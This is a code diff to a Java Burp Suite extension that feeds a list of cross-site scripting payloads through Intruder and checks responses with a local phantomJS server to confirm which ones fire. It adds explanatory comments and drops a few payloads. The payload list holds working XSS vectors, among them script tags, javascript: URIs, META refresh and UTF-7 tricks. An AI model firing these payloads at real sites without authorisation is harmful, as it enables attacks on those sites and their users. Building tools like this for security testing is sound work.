@@ -18,7 +18,6 @@ import org.apache.http.message.BasicNameValuePair;
 
 import org.apache.commons.codec.binary.Base64;
 
-
 public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayloadGeneratorFactory, IIntruderPayloadProcessor	{
 	public burp.IBurpExtenderCallbacks mCallbacks;
 	private IExtensionHelpers helpers;
@@ -27,10 +26,18 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
     
     private HttpClient client;
     
+    // Default server location for phantomJS Server
+    // If you're using a customer server, please change and recompile.
     private static String phantomServer = "http://127.0.0.1:8093";
 	
     /**
-     * Initial Payloads. Will add capability to load from file
+     * Initial Payloads containing trigger phrase, f7sdgfjFpoG.
+     * 
+     * The phantom server is designed to report XSS only if the
+     * function calls contain the trigger phrase, suggesting
+     * that it was passed via the Burp payload.
+     * 
+     * This is used to reduce the liklihood of false-positives.
      */
 	public static final byte[][] PAYLOADS = {
 		"<script>alert('f7sdgfjFpoG')</script>".getBytes(),
@@ -62,10 +69,7 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
 		"<BR SIZE=\"&{alert('f7sdgfjFpoG')}\">".getBytes(),
 		"<LINK REL=\"stylesheet\" HREF=\"javascript:alert('f7sdgfjFpoG');\">".getBytes(),
 		"<IMG SRC='vbscript:msgbox(\"f7sdgfjFpoG\")'>".getBytes(),
-		"<IMG SRC=\"mocha:[code]\">".getBytes(),
-		"<IMG SRC=\"livescript:[code]\">".getBytes(),
 		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=javascript:alert('f7sdgfjFpoG');\">".getBytes(),
-		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">".getBytes(),
 		"<META HTTP-EQUIV=\"Link\" Content=\"<javascript:alert('f7sdgfjFpoG')>; REL=stylesheet\">".getBytes(),
 		"<META HTTP-EQUIV=\"refresh\" CONTENT=\"0; URL=http://;URL=javascript:alert('f7sdgfjFpoG');\">".getBytes(),
 		"<IFRAME SRC=\"javascript:alert('f7sdgfjFpoG');\"></IFRAME>".getBytes(),
@@ -84,12 +88,10 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
 		"<BASE HREF=\"javascript:alert('f7sdgfjFpoG');//\">".getBytes(),
 		"<OBJECT classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('f7sdgfjFpoG')></OBJECT>".getBytes(),
 		"getURL(\"javascript:alert('f7sdgfjFpoG')\")".getBytes(),
-		"a=\"get\";".getBytes(),
 		"<!--<value><![CDATA[<XML ID=I><X><C><![CDATA[<IMG SRC=\"javas<![CDATA[cript:alert('f7sdgfjFpoG');\">".getBytes(),
 		"<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('f7sdgfjFpoG')&lt;/SCRIPT&gt;\">".getBytes(),
 		"<HEAD><META HTTP-EQUIV=\"CONTENT-TYPE\" CONTENT=\"text/html; charset=UTF-7\"> </HEAD>+ADw-SCRIPT+AD4-alert('f7sdgfjFpoG');+ADw-/SCRIPT+AD4-".getBytes(),
 	};
-	
 	
 	public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
 		mCallbacks = callbacks;
@@ -115,10 +117,6 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
         // return a new IIntruderPayloadGenerator to generate payloads for this attack
         return new IntruderPayloadGenerator();
     }
-
-    //
-    // implement IIntruderPayloadProcessor
-    //
     
     @Override
     public String getProcessorName() {
@@ -130,6 +128,23 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
     	return helpers.stringToBytes(helpers.urlEncode(helpers.bytesToString(currentPayload)));
     }
     
+    /**
+     * This function is called every time Burp receives an HTTP message.
+     * We look specifically at messages that contain a toolFlag of 32,
+     * indicating that the message is intended for the intruder. If it's
+     * not, we don't care about it.
+     * 
+     * The function currently ignores requests, and handles only HTTP
+     * responses. The response is captured and encoded, then passed
+     * along to the phantomJS server for processing.
+     * 
+     * If the phantomJS server indicates a successful XSS attack,
+     * append the phrase 'fy7sdufsuidfhuisdf' to the response.
+     * 
+     * We then use this phrase in accompaniment with intruders grep-match
+     * functionality to determine whether the specific payload triggered
+     * xss.
+     */
 	public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo) {
         if (toolFlag == 32 && messageIsRequest) {
         	// Manipulate intruder request, if necessary
@@ -164,7 +179,14 @@ public class BurpExtender implements IBurpExtender, IHttpListener, IIntruderPayl
         	}
         }
 	}
-		
+	
+	/**
+	 * 
+	 * Basic class to generate intruder payloads.
+	 * 
+	 * In this case, simply iterate over the payloads defined
+	 * in the parent class.	
+	 */
 	class IntruderPayloadGenerator implements IIntruderPayloadGenerator {
 		int payloadIndex;
 		
